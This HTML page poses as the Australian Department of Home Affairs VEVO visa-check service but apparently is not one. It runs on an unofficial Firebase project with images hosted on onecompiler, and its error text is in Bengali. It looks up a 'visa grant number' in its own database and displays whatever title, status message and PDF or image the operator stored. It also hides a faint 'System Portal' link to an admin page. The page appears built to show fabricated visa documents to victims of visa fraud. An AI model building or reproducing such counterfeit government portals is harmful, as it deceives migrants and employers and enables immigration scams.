<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Immigration and Citizenship - Australia</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
  body{margin:0;font-family:Arial,Helvetica,sans-serif;background:#fff;color:#222}
  header{background:#002f6c;color:#fff;display:flex;align-items:center;padding:10px 20px}
  header img{height:40px;margin-right:10px}
  header span{font-size:18px;font-weight:bold}
  .hero-banner{width:100%;height:160px;background:url('https://uploads.onecompiler.io/44dvaqp3k/44dvarfqb/1000208616.jpg') center center/cover no-repeat}
  #searchBox{margin:20px auto;max-width:600px;padding:20px;border:1px solid #ccc;border-radius:8px;background:#f9f9f9}
  label{display:block;margin-top:10px;font-weight:bold;text-align:left}
  input{width:100%;padding:10px;margin-top:5px;border:1px solid #ccc;border-radius:6px}
  button{background:#0055a5;color:#fff;border:none;padding:10px 16px;border-radius:6px;cursor:pointer;margin-top:10px}
  button:hover{opacity:0.9}
  .error{color:red;font-weight:bold;margin-top:10px}
  iframe,img{max-width:100%;border-radius:6px}
  .img-full{width:100%;display:block}
 .gov-footer{background:#001d3d;color:#fff;text-align:center;padding:25px;font-size:12px}
</style>
</head>
<body>

<header>
  <img src="https://uploads.onecompiler.io/43wr3eujf/43yf4pmr4/1000002868.png" alt="Gov Crest">
  <span>Department of Home Affairs</span>
</header>

<div class="hero-banner"></div>
      <div class="form-group">
  </div>
  <img src="https://uploads.onecompiler.io/44dvaqp3k/44dvarfqb/1000208525.png" class="img-full">
    <span style="font-size:15px; font-weight:500;">Department of Home Affairs Australia eVisa Status – Check Online (VEVO) Description of Australian ETA </span>
    <span style="font-size:15px; font-weight:500;">Visa Entitlement Verification Online (VEVO) Allows visa Holders, Employers, Education Providers and Other,</span>
    </div>
  
  <div id="searchBox">
    <img src="https://uploads.onecompiler.io/44dvaqp3k/44dvarfqb/1000208577.png" style="height:20px">
       <span style="font-size:20px; font-weight:500;">Check visa details and conditions</span>
    <p>Organisations to Check visa Details and Conditions VEVO tells you details relating to your current in-effect visa:</p>
    <img src="https://uploads.onecompiler.io/44dvaqp3k/44dvarfqb/1000208618.png" style="height:22px">
    <span style="font-size:16px; font-weight:500;">Full Name</span>
   <label></label>
  <input id="nameBox" placeholder="Enter Full Name">
  <label>Date of Birth</label>
  <input id="dobBox" placeholder="DD/MM/YYYY">
  <label>Visa Grant Number</label>
  <input id="idBox" placeholder="Enter Visa Number">
  <button onclick="doSearch()">Check visa details</button>
  <div id="result"> 

</div>
  <img src="https://uploads.onecompiler.io/44dvaqp3k/44dvarfqb/1000208650.jpg" class="img-full">
  <img src="https://uploads.onecompiler.io/44dvaqp3k/44dvarfqb/1000208640.jpg" style="height:60px">
<div id="viewer" style="display:none;margin:18px auto;max-width:500px"></div>
</div>

<div class="bottom-section">
  <img src="https://uploads.onecompiler.io/44dvaqp3k/44dvarfqb/1000208643.png" class="img-full">
  <img src="https://uploads.onecompiler.io/44dvaqp3k/44dvarfqb/1000208526.png" class="img-full">
  <img src="https://uploads.onecompiler.io/44dvaqp3k/44dvarfqb/1000208625.jpg" class="img-full">
  <img src="https://uploads.onecompiler.io/44dvaqp3k/44dvarfqb/1000208620.jpg" class="img-full">
  <img src="https://uploads.onecompiler.io/44dvaqp3k/44dvarfqb/1000208623.jpg" class="img-full">
  <footer class="gov-footer">
  </footer>

</div>

  <a href="admin.html" style="opacity:0.2;font-size:5px;color:#001d3d;text-decoration:none;">System Portal</a>
</footer>
<script type="module">
  import { initializeApp } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-app.js";
  import { getFirestore, collection, getDocs, doc, updateDoc } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore.js";

  const firebaseConfig = {
    apiKey: "AIzaSyBnpyZxD7Ju7JQdNYTOnasAeiihDKS0bpI",
    authDomain: "australian-web-9a688.firebaseapp.com",
    projectId: "australian-web-9a688",
    storageBucket: "australian-web-9a688.appspot.com",
    messagingSenderId: "946515883281",
    appId: "1:946515883281:web:0837fe8a0c75e0f7ed08b0"
  };
  const app = initializeApp(firebaseConfig);
  const db = getFirestore(app);

  window.doSearch = async () => {
    const q = document.getElementById("idBox").value.trim();
    const res = document.getElementById("result");
    const v = document.getElementById("viewer");
    res.innerHTML=""; v.style.display="none";

    const snap = await getDocs(collection(db,"entries"));
    let found = null;
    snap.forEach(docSnap => {const d=docSnap.data(); if(d.id===q) found={...d,docId:docSnap.id};});

    if(!found){
      res.innerHTML="<p class='error'>VEVO রেকর্ড পাওয়া যায়নি — পরে চেষ্টা করুন।</p>";
      return;
    }

    // Update views count
    const docRef = doc(db, "entries", found.docId);
    await updateDoc(docRef, {views: (found.views || 0) + 1});

    let embed="";
    if(found.link.toLowerCase().endsWith(".pdf")){
      embed=`<iframe src="${found.link}" width="100%" height="500"></iframe>`;
    }else if(found.link.match(/\.(jpg|jpeg|png|gif|webp)$/)){
      embed=`<img src="${found.link}" alt="${found.title}">`;
    }else{
      embed=`<iframe src="${found.link}" width="100%" height="500"></iframe>`;
    }

    const msgColor = found.messageColor === "green" ? "green" : "red";
    v.innerHTML=`<h3>${found.title} (${found.id})</h3><p style="color:${msgColor}">${found.message||''}</p>${embed}`;
    v.style.display="block";
  }
</script>
</body>
</html>
